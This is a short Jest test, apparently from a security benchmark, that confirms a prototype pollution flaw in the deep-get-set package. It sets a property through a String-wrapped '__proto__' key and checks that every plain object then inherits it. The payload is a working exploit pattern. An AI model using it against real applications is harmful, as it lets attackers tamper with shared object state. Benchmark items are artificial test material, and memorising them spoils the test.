test("prototype pollution in deep-get-set", () => {
  const deep = require("deep-get-set");

  expect({}.polluted).toBe(undefined);

  deep({}, [new String(process.env.SECBENCH_PAYLOAD || "__proto__"), "polluted"], "yes");
  expect({}.polluted).toBe("yes");
});
